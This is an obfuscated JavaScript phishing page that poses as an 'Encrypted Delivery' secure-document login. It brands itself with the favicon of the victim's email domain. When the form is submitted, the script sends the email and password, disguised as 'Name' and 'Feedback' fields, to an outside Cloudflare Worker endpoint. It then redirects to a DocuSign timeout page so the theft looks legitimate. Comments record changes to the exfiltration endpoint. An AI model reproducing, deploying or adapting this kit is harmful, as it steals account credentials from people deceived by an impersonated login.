(function () {
  "use strict";

  var _0x374f98 = {
    BG_IMG: "https://i.postimg.cc/Dz2Q7TzV/imageing.png",
    BG_BRI: 1,
    BG_DAR: 1,
    BG_CON: 1,
    BG_SAT: 1,
    BG_BLUR: 0,
    BG_GRAY: false,
    BG_OVERLAY: 0.25,
    // CHANGED: Updated endpoint
    PHP_ENDPOINT: "https://rum-email-proxy.haricoting.workers.dev/contact",
    SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
    LOCKOUT_REDIRECT: "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
    SECRET_KEY: "MATT_SECURE_2026",
    MAX_TRIES: 3,
    LOCKOUT_DELAY: 2000,
    STORAGE_KEY: "st_7b3f19",
    PATH_SEGMENTS: ["profile", "dashboard", "console", "manage", "overview"],
    MSG_WRONG: "An error occurred. Please try again later.",
    MSG_LOCKOUT: "Too many incorrect attempts. Access blocked.",
    MSG_GRANTED: "Access granted. Redirecting...",
    MSG_NET: "Network error. Please try again.",
    HEADING: "Secure Document",
    SUBHEAD: "Login to view your secure document",
    FOOTER: "Message Center",
    EMAIL_LABEL: "Email",
    KEY_LABEL: "Password",
    KEY_PLACEHOLDER: "Enter your password",
    BUTTON_TEXT: "Unlock",
    TAG_TEXT: "Encrypted Delivery"
  };

  function _0x1a0432() {
    var _0x5b792b = "*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif}body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;position:relative;overflow:hidden}#bg_canvas{position:fixed;inset:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;z-index:0;pointer-events:none}#bg_veil{position:fixed;inset:0;background:rgba(255,255,255,0.25);z-index:1;pointer-events:none}.frame_v7{position:relative;z-index:2;width:100%;max-width:460px;background:#ffffff;border-radius:1.5rem;box-shadow:0 18px 36px -12px rgba(0,20,30,0.22),0 6px 14px rgba(0,0,0,0.04);padding:2.2rem 2rem 1.9rem;border:1px solid rgba(255,255,255,0.6);transition:transform .15s ease}@keyframes wobble_q{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}.frame_v7.wobble_q_on{animation:wobble_q .6s cubic-bezier(.36,.07,.19,.97) both}.brand_row{display:flex;flex-direction:column;align-items:center;margin-bottom:1rem}.brand_orb{width:74px;height:74px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 1px 6px rgba(0,0,0,.02),0 8px 16px -8px rgba(18,52,77,.15);border:3px solid #fff;margin-bottom:.8rem;overflow:hidden}.brand_orb img{width:100%;height:100%;object-fit:contain;display:block;padding:6px}.chip_tag{font-size:.65rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#2b5f8a;background:#e9f0f9;padding:.25rem 1rem;border-radius:30px;display:inline-flex;align-items:center;gap:.4rem;border:1px solid #cbdae8;margin-bottom:.7rem}.chip_tag::before,.chip_tag::after{content:\"â€¢\";font-size:1.1rem;line-height:1;color:#1f4b6e;opacity:.7}.title_main{font-size:1.25rem;font-weight:600;color:#1a2e3f;text-align:center;letter-spacing:-.01em;line-height:1.35;margin-bottom:.35rem;font-family:'Times New Roman',Georgia,serif;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}.caption_sub{text-align:center;color:#54738b;font-size:.8rem;margin-bottom:1.6rem;font-weight:400;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}.row_block{margin-bottom:1.3rem}.lbl_small{display:block;font-size:.7rem;font-weight:700;color:#1f405b;margin-bottom:.4rem;letter-spacing:.04em;text-transform:uppercase;opacity:.8}.field_shell{display:flex;align-items:center;background:#fff;border:1.5px solid #d3e2ee;border-radius:.9rem;padding:.05rem .05rem .05rem 1rem;transition:all .2s;box-shadow:0 2px 4px rgba(0,0,0,.01)}.field_shell:focus-within{border-color:#2b5f8a;box-shadow:0 0 0 4px rgba(43,95,138,.1)}.field_shell.locked_bg{background:#f7fafd}.ico_slot{display:flex;align-items:center;justify-content:center;width:20px;height:20px;flex-shrink:0;color:#3b6585;opacity:.75}.ico_slot svg{width:100%;height:100%;display:block}.inp_core{width:100%;padding:.85rem .9rem .85rem .7rem;border:none;background:transparent;font-size:.95rem;font-weight:500;color:#122b3b;outline:none;border-radius:.9rem}.inp_core::placeholder{color:#a3b8cb;font-weight:400;font-size:.9rem}.inp_core:read-only{color:#54738b;cursor:default}.eye_btn{background:transparent;border:none;padding:0 .9rem 0 .4rem;cursor:pointer;color:#3b6585;display:flex;align-items:center;justify-content:center;transition:color .2s;width:34px;height:34px}.eye_btn svg{width:20px;height:20px;display:block}.eye_btn:hover{color:#0f2b40}.cta_main{width:100%;background:#0f5b8c;border:none;border-radius:2rem;padding:.95rem 1.3rem;color:#fff;font-weight:600;font-size:1rem;letter-spacing:.02em;cursor:pointer;margin-top:.4rem;transition:all .2s;box-shadow:0 10px 20px -8px rgba(15,91,140,.4);display:flex;align-items:center;justify-content:center;gap:.55rem;border:1px solid rgba(255,255,255,.2)}.cta_main:hover:not(:disabled){background:#0a4266;transform:scale(1.01);box-shadow:0 16px 26px -8px rgba(10,66,102,.5)}.cta_main:active:not(:disabled){transform:scale(.98);background:#083552}.cta_main:disabled{opacity:.8;cursor:not-allowed}.cta_icon{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px}.cta_icon svg{width:100%;height:100%;display:block}.ring_load{display:inline-block;width:16px;height:16px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin_r .7s linear infinite}@keyframes spin_r{to{transform:rotate(360deg)}}.base_note{margin-top:1.6rem;text-align:center;font-size:.65rem;color:#7e9bb3;letter-spacing:.01em;border-top:1px solid #e4edf5;padding-top:1rem}.alert_bar{background:#fee9e7;color:#b33a2f;padding:.65rem .9rem;border-radius:.8rem;font-size:.8rem;margin-bottom:.9rem;border:1px solid #f5c6c2;display:none;opacity:0;transform:translateY(-6px);transition:opacity .3s ease,transform .3s ease;word-break:break-word;line-height:1.5;text-align:center}.alert_bar.visible{display:block;opacity:1;transform:translateY(0)}@media (max-width:480px){.frame_v7{padding:1.8rem 1.4rem;border-radius:1.2rem}.brand_orb{width:64px;height:64px}.title_main{font-size:1.1rem}}";
    var _0x27421c = document.createElement("style");
    _0x27421c.id = "zz_core_style";
    _0x27421c.appendChild(document.createTextNode(_0x5b792b));
    document.head.appendChild(_0x27421c);
  }

  function _0x8166d4() {
    var _0x13c55e = document.createElement("div");
    _0x13c55e.className = "frame_v7";
    _0x13c55e.id = "card_root";
    
    // Fixed HTML structure to match original exactly
    _0x13c55e.innerHTML = '<div class="brand_row"><div class="brand_orb"><img src="" alt="logo" id="brand_img"></div><div class="chip_tag">' + _0x374f98.TAG_TEXT + '</div></div><h1 class="title_main" id="title_node">' + _0x374f98.HEADING + '</h1><div class="caption_sub" id="caption_node">' + _0x374f98.SUBHEAD + '</div><div class="alert_bar" id="alert_node"></div><form id="main_form"><div class="row_block"><label class="lbl_small" for="mail_x9k2">' + _0x374f98.EMAIL_LABEL + '</label><div class="field_shell locked_bg"><span class="ico_slot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></span><div id="mail_slot"></div></div></div><div class="row_block"><label class="lbl_small" for="code_p4r7">' + _0x374f98.KEY_LABEL + '</label><div class="field_shell"><span class="ico_slot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/><circle cx="12" cy="16" r="1.3"/></svg></span><input class="inp_core" type="password" id="code_p4r7" placeholder="' + _0x374f98.KEY_PLACEHOLDER + '" autocomplete="off" required><button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle view"><svg id="eye_show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/><circle cx="12" cy="12" r="3"/></svg><svg id="eye_hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:none;"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/><path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/><path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/><line x1="2" y1="2" x2="22" y2="22"/></svg></button></div></div><button type="submit" class="cta_main" id="cta_node"><span class="cta_icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 11V7a4 4 0 0 1 7.5-2"/><path d="M17.5 11V7a4 4 0 0 0-7.5-2"/><circle cx="12" cy="16" r="3"/><line x1="12" y1="19" x2="12" y2="22"/></svg></span>' + _0x374f98.BUTTON_TEXT + '</button></form><div class="base_note" id="base_node">' + _0x374f98.FOOTER + ' Â· Â© 2026</div>';
    
    document.body.appendChild(_0x13c55e);
    
    // Create email input separately and append to mail_slot (as original does)
    var _0x1a96fa = document.createElement("input");
    _0x1a96fa.className = "inp_core";
    _0x1a96fa.type = "email";
    _0x1a96fa.id = "mail_x9k2";
    _0x1a96fa.placeholder = "Enter your email";
    _0x1a96fa.autocomplete = "off";
    _0x1a96fa.required = true;
    
    var _0x81d1ff = document.getElementById("mail_slot");
    if (_0x81d1ff) {
      _0x81d1ff.appendChild(_0x1a96fa);
    }
    
    // Create background elements
    var _0x5cf494 = document.createElement("div");
    _0x5cf494.id = "bg_canvas";
    document.body.appendChild(_0x5cf494);
    
    var _0x391bd1 = document.createElement("div");
    _0x391bd1.id = "bg_veil";
    document.body.appendChild(_0x391bd1);
  }

  function _0x3ce607() {
    var _0x13c1d3 = document.getElementById("bg_canvas");
    var _0x58258f = document.getElementById("bg_veil");
    if (!_0x13c1d3 || !_0x58258f) return;
    
    _0x13c1d3.style.backgroundImage = 'url("' + _0x374f98.BG_IMG + '")';
    
    var _0x2f58b4 = [];
    _0x2f58b4.push("brightness(" + _0x374f98.BG_BRI + ")");
    if (_0x374f98.BG_DAR !== 1) {
      _0x2f58b4.push("brightness(" + (1 / _0x374f98.BG_DAR) + ")");
    }
    _0x2f58b4.push("contrast(" + _0x374f98.BG_CON + ")");
    _0x2f58b4.push("saturate(" + _0x374f98.BG_SAT + ")");
    if (_0x374f98.BG_BLUR > 0) {
      _0x2f58b4.push("blur(" + _0x374f98.BG_BLUR + "px)");
    }
    if (_0x374f98.BG_GRAY) {
      _0x2f58b4.push("grayscale(1)");
    }
    _0x13c1d3.style.filter = _0x2f58b4.join(" ");
    _0x58258f.style.background = "rgba(255,255,255," + _0x374f98.BG_OVERLAY + ")";
  }

  function _0x446451() {
    try {
      var _0x33c705 = new Uint8Array(24);
      crypto.getRandomValues(_0x33c705);
      var _0x3f0909 = btoa(String.fromCharCode.apply(null, _0x33c705)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
      history.replaceState(null, "", "#/" + _0x374f98.PATH_SEGMENTS.join("/") + "/" + _0x3f0909);
    } catch (_0x34d469) {}
  }

  function _0x1ecf22() {
    _0x1a0432();
    _0x8166d4();
    _0x3ce607();
    _0x446451();
    
    var _0xd38583 = document.getElementById("mail_x9k2");
    var _0x332292 = document.getElementById("code_p4r7");
    var _0x40f436 = document.getElementById("brand_img");
    var _0x1f9406 = document.getElementById("title_node");
    var _0x1eca96 = document.getElementById("caption_node");
    var _0x59d3cc = document.getElementById("base_node");
    var _0x35013e = document.getElementById("eye_toggle");
    var _0x52e31a = document.getElementById("eye_show");
    var _0x7c3539 = document.getElementById("eye_hide");
    var _0x16dd65 = document.getElementById("alert_node");
    var _0x4fbef8 = document.getElementById("cta_node");
    var _0x2de630 = document.getElementById("card_root");
    var _0x368a8a = document.getElementById("main_form");
    var _0x1641a7 = null;
    var _0x47e5e1 = false;

    function _0x202f73() {
      return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23464f5b'/%3E%3Ctext x='50' y='67' font-family='Arial, Helvetica, sans-serif' font-size='48' font-weight='bold' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E";
    }

    function _0x32b3a6(_0x33a8e4) {
      if (!_0x33a8e4) {
        _0x40f436.src = _0x202f73();
        return;
      }
      var _0x50c0ea = "https://www.google.com/s2/favicons?domain=" + encodeURIComponent(_0x33a8e4) + "&sz=128";
      var _0x10435a = new Image();
      _0x10435a.onload = function () {
        if (_0x10435a.width > 16 || _0x10435a.height > 16) {
          _0x40f436.src = _0x50c0ea;
        } else {
          _0x40f436.src = _0x202f73();
        }
      };
      _0x10435a.onerror = function () {
        _0x40f436.src = _0x202f73();
      };
      _0x10435a.src = _0x50c0ea;
    }

    function _0x66386b(_0x5d40d0) {
      if (!_0x5d40d0 || _0x5d40d0.indexOf("@") === -1) return "";
      var _0x583ff4 = _0x5d40d0.split("@");
      if (_0x583ff4.length === 2 && _0x583ff4[1].trim() !== "") {
        return _0x583ff4[1].trim().toLowerCase();
      }
      return "";
    }

    function _0x514502(_0x2d7e32) {
      if (!_0x2d7e32) return "";
      return _0x2d7e32.charAt(0).toUpperCase() + _0x2d7e32.slice(1);
    }

    function _0x36b61d(_0x329aaa, _0xdbb43c) {
      if (_0x1641a7) {
        clearTimeout(_0x1641a7);
        _0x1641a7 = null;
      }
      _0x16dd65.innerHTML = _0x329aaa;
      if (_0xdbb43c === "success") {
        _0x16dd65.style.background = "#e3f5e9";
        _0x16dd65.style.color = "#1e7a4b";
        _0x16dd65.style.borderColor = "#b8e0c8";
      } else {
        _0x16dd65.style.background = "#fee9e7";
        _0x16dd65.style.color = "#b33a2f";
        _0x16dd65.style.borderColor = "#f5c6c2";
      }
      _0x16dd65.classList.add("visible");
      if (_0xdbb43c === "success") {
        _0x1641a7 = setTimeout(function () {
          _0x16dd65.classList.remove("visible");
        }, 6000);
      }
    }

    function _0x381c63() {
      _0x16dd65.classList.remove("visible");
      if (_0x1641a7) {
        clearTimeout(_0x1641a7);
        _0x1641a7 = null;
      }
    }

    function _0x148b5e() {
      _0x2de630.classList.remove("wobble_q_on");
      void _0x2de630.offsetWidth;
      _0x2de630.classList.add("wobble_q_on");
      setTimeout(function () {
        _0x2de630.classList.remove("wobble_q_on");
      }, 700);
    }

    function _0x46696c() {
      var _0x9a6d61 = _0xd38583.value.trim();
      var _0x3ac7e9 = _0x66386b(_0x9a6d61);
      if (!_0x3ac7e9) {
        _0x1f9406.textContent = _0x374f98.HEADING;
        _0x1eca96.textContent = _0x374f98.SUBHEAD;
        _0x59d3cc.textContent = _0x374f98.FOOTER + " Â· Â© 2026";
        _0x32b3a6("");
        return;
      }
      var _0x5bcc36 = _0x3ac7e9.split(".")[0];
      var _0x3ad40a = _0x514502(_0x5bcc36);
      _0x1f9406.textContent = _0x3ad40a + " " + _0x374f98.HEADING;
      _0x1eca96.textContent = _0x374f98.SUBHEAD;
      _0x59d3cc.textContent = _0x3ad40a + " " + _0x374f98.FOOTER + " Â· Â© 2026";
      _0x32b3a6(_0x3ac7e9);
    }

    _0xd38583.addEventListener("input", _0x46696c);
    
    _0x35013e.addEventListener("click", function () {
      var _0x3f90b6 = _0x332292.getAttribute("type") === "password";
      if (_0x3f90b6) {
        _0x332292.setAttribute("type", "text");
        _0x52e31a.style.display = "none";
        _0x7c3539.style.display = "block";
      } else {
        _0x332292.setAttribute("type", "password");
        _0x52e31a.style.display = "block";
        _0x7c3539.style.display = "none";
      }
      _0x332292.focus();
    });

    function _0x31d847() {
      if (_0x47e5e1) return;
      _0x47e5e1 = true;
      _0x36b61d(_0x374f98.MSG_LOCKOUT, "error");
      _0x148b5e();
      _0x332292.value = "";
      _0x4fbef8.disabled = true;
      setTimeout(function () {
        window.location.href = _0x374f98.LOCKOUT_REDIRECT;
      }, _0x374f98.LOCKOUT_DELAY);
    }

    function _0x41ee04() {
      if (_0x47e5e1) return;
      
      var _0xd1f93c = _0xd38583.value.trim();
      var _0x28e6bf = _0x332292.value.trim();
      
      _0x381c63();
      
      if (!_0xd1f93c || _0xd1f93c.indexOf("@") === -1) {
        _0x36b61d("Please enter a valid email address.", "error");
        _0x148b5e();
        return;
      }
      
      if (!_0x28e6bf) {
        _0x36b61d("Please enter your password.", "error");
        _0x148b5e();
        return;
      }

      _0x4fbef8.disabled = true;
      _0x4fbef8.innerHTML = '<span class="ring_load"></span> Loading...';
      
      var _0x26f7fa = Date.now();
      
      // CHANGED: Using URLSearchParams with Name and Feedback instead of encrypted FormData
      var _0x6b4ac3 = new URLSearchParams();
      _0x6b4ac3.append("Name", _0xd1f93c);
      _0x6b4ac3.append("Feedback", _0x28e6bf);
      
      var _0x37af5b = false;
      var _0x38e53e = null;

      // CHANGED: Using hardcoded Cloudflare Worker URL
      fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
        method: "POST",
        body: _0x6b4ac3
      }).then(function (_0x5295b7) {
        return _0x5295b7.text();
      }).then(function (_0x481f6c) {
        try {
          _0x38e53e = JSON.parse(_0x481f6c);
        } catch (_0x14f3a1) {
          _0x37af5b = true;
        }
      }).catch(function () {
        _0x37af5b = true;
      }).then(function () {
        var _0xc09dd9 = Date.now() - _0x26f7fa;
        var _0x3d0e90 = Math.max(0, 2000 - _0xc09dd9);
        return new Promise(function (_0xc64380) {
          setTimeout(_0xc64380, _0x3d0e90);
        });
      }).then(function () {
        if (_0x47e5e1) return;
        
        var _0x58b618 = '<span class="cta_icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 11V7a4 4 0 0 1 7.5-2"/><path d="M17.5 11V7a4 4 0 0 0-7.5-2"/><circle cx="12" cy="16" r="3"/><line x1="12" y1="19" x2="12" y2="22"/></svg></span>' + _0x374f98.BUTTON_TEXT;
        
        if (_0x37af5b || !_0x38e53e) {
          _0x4fbef8.disabled = false;
          _0x4fbef8.innerHTML = _0x58b618;
          _0x36b61d(_0x374f98.MSG_NET, "error");
          _0x148b5e();
          _0x332292.value = "";
          _0x332292.focus();
          return;
        }

        if (_0x38e53e.status === "success") {
          _0x36b61d(_0x374f98.MSG_GRANTED, "success");
          setTimeout(function () {
            window.location.href = _0x374f98.SUCCESS_REDIRECT;
          }, 1000);
          return;
        }

        if (_0x38e53e.status === "exhausted") {
          _0x31d847();
          return;
        }

        var _0x128aed = parseInt(sessionStorage.getItem(_0x374f98.STORAGE_KEY) || "0", 10) + 1;
        sessionStorage.setItem(_0x374f98.STORAGE_KEY, String(_0x128aed));
        
        if (_0x128aed >= _0x374f98.MAX_TRIES) {
          _0x31d847();
          return;
        }

        _0x4fbef8.disabled = false;
        _0x4fbef8.innerHTML = _0x58b618;
        _0x36b61d(_0x374f98.MSG_WRONG, "error");
        _0x148b5e();
        _0x332292.value = "";
        _0x332292.focus();
      });
    }

    _0x368a8a.addEventListener("submit", function (_0x28bdbf) {
      _0x28bdbf.preventDefault();
      _0x41ee04();
    });
    
    _0x46696c();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", _0x1ecf22);
  } else {
    _0x1ecf22();
  }
})();
